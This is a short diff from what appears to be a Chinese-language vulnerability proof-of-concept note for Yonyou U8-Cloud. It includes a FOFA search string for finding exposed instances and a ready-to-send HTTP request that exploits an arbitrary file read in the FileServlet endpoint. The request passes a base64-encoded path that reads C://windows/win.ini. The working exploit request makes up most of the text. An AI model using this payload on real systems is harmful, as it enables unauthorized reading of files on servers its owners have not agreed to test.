@@ -36,11 +36,11 @@ app="用友-U8-Cloud"
   
 漏洞数据包：  
 ```
-GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ== HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept: */*
-Connection: Keep-Alive
+GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ== HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
 ```  
   
 QzovL3dpbmRvd3Mvd2luLmluaQ== 是C://windows/win.ini 的base64编码  
